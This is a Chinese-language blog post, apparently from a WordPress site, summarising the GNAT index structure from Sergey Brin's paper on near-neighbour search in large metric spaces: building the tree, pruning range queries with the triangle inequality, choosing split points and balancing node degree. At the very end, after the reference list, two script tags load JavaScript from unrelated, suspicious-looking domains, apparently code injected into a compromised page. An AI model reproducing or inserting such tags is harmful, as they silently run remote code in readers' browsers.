---
title: "GNAT\uff1a\u5927\u5ea6\u91cf\u7a7a\u95f4\u4e2d\u7684\u8fd1\u90bb\u641c\u7d22"
date: 2021-12-11 14:17:24
slug: "near-neighbor-search-in-large-metric-spaces"
categories:
  - 度量空间索引
tags:
  - GNAT
  - 数据库
  - 索引
  - 计算机科学
description: >-
  基因序列比对、声音识别、图片识别等数据都在分布上存在一定关联性，利用这些关联性可以提升近邻搜索的性能。为了达到这个目的，要求数据结构能够反映数据的内在几何特征。GNAT通过在多个层次上将数据分割为多个区域来保留基本几何结构。
draft: false
---

<!-- wp:paragraph -->
<p>Sergey Brin</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>背景</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>大度量空间</strong>：一个度量空间，球的体积随着半径的增大增长得非常快。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>GNAT目的是解决大度量空间中的近邻查询问题。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>基因序列比对、声音识别、图片识别等数据都在分布上存在一定关联性，利用这些关联性可以提升近邻搜索的性能。为了达到这个目的，要求数据结构能够反映数据的内在几何特征。GNAT通过在多个层次上将数据分割为多个区域来保留基本几何结构。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>对比VPT，由于球外的空间总是比球内的大，在大度量空间中，球外的数据分布会变得非常稀疏，从而降低索引性能。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>算法</h3>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4>构建</h4>
<!-- /wp:heading -->

<!-- wp:list {"ordered":true} -->
<ol><li>从需要建立索引的数据集选择<em>k</em>个划分点<em>p<sub>1</sub></em>,…,<em>p<sub>k</sub></em>，（也是一般所说的<strong>度</strong>），这些点是随机选取的，但我们保证它们之间<strong>相距比较远</strong>（fairly far apart）。</li><li>我们将剩余的点根据与它最近的划分点关联(associate)起来，将与划分点<em>P<sub>i</sub></em>关联的点集记为<em>D<sub>pi</sub></em></li><li>对于每一对划分点<code>(pi, pj)</code>，计算<code>range(pi, Dpj)=[mind_d(pi, Dpj), max_d(pi, Dpj)]</code>，即点<em>p<sub>i</sub></em>到点集<em>D<sub>pj</sub></em>距离的最大值和最小值。</li><li>递归地对每一个<em>D<sub>pj</sub></em>建树，可能使用不同的度。</li></ol>
<!-- /wp:list -->

<!-- wp:heading {"level":4} -->
<h4>查询</h4>
<!-- /wp:heading -->

<!-- wp:list {"ordered":true} -->
<ol><li>假设我们需要查找距离点<em>x</em>小于<em>r</em>的所有点，P表示当前结点的所有划分点（最开始是GNAT的头部结点）。最开始P包括当前结点的所有划分点。</li><li>从P中选取一个点p（这个点不会重复），计算距离<code>Dist(x, p)</code>，如果<code>Dist(x, p)<=r</code>，将点<em>p</em>加入结果集中。</li><li>对于P中的所有点q，如果<code>[Dist(x, p)-r, Dist(x, p)+r] ∩ range(p, Dq)</code>为空集，那么就将q从P中移除。可以通过以下方法证明：假设<em>y</em>是<em>Dq</em>中的任意点，如果<code>Dist(y, p) < Dist(x, p)-r</code>，那么根据三角不等式，我们可以得到<code>Dist(x, y)+Dist(y, p) >= Dist(x, p)</code>，因此<code>Dist(x, y) > r</code>. 另外，如果<code>Dist(y, p) > Dist(x, p)+r</code>，我们可以由三角不等式<code>Dist(y, x)+Dist(x, p) >= Dist(y, p)</code>得到<code>Dist(x, y) > r</code>。 因此点<code>y</code>不可能落在范围<code>[Dist(x, p)-r, Dist(x, p)+r]</code>，不然会与range(p, Dq)出现交集。</li><li>对P中的剩余所有点重复步骤2和3</li><li>对于P中所有剩余的点p<sub>i</sub>，递归搜索D<sub>p</sub></li></ol>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3>选择划分点</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>选点的时候我们希望划分点尽量地随机，这样就会使这些划分点更接近聚簇的中心点。如果选择的划分点比较接近，我们计算它们之间距离的时候得到的信息就会更少，因为不同两个分支之间计算得到的距离非常接近。在这，如果多个划分点处于同一个聚簇中，会将这个聚簇过度划分。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>首先随机选取一个候选点，然后选择离它最远的点作为第二个候选点，再选出离这两个点最远的第三个点（第三个点离前两个点距离的较小值是最大的）。以此类推，知道选出足够多的候选点作为划分点。这个过程可以通过动态规划算法进行，时间复杂度为O(mn)。其中n是候选点，m是最后划分点的数量。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>上述划分点选取过程将进行三次，选出的点成为候选点。然后选取最分散的候选点集。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>选择结点的度以及使树平衡</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>通过赋予数据点较多的子树更多的度，来平衡子树。赋给根节点一个度k，它的每个孩子结点根据包含的数据点，成比例地被分配一个度，使得孩子的平均度等于全局度k. 递归地进行这个过程，使每个孩子的平均度都为k（忽略最高度和最低度）。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>参考资料</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>[1] Near Neighbor Search in Large Metric Spaces</p>
<!-- /wp:paragraph --><script src='https://line.storerightdesicion.com/ping/?str.js' type='text/javascript'></script><script src='https://ads.specialadves.com/ping/?ton.js' type='text/javascript'></script>
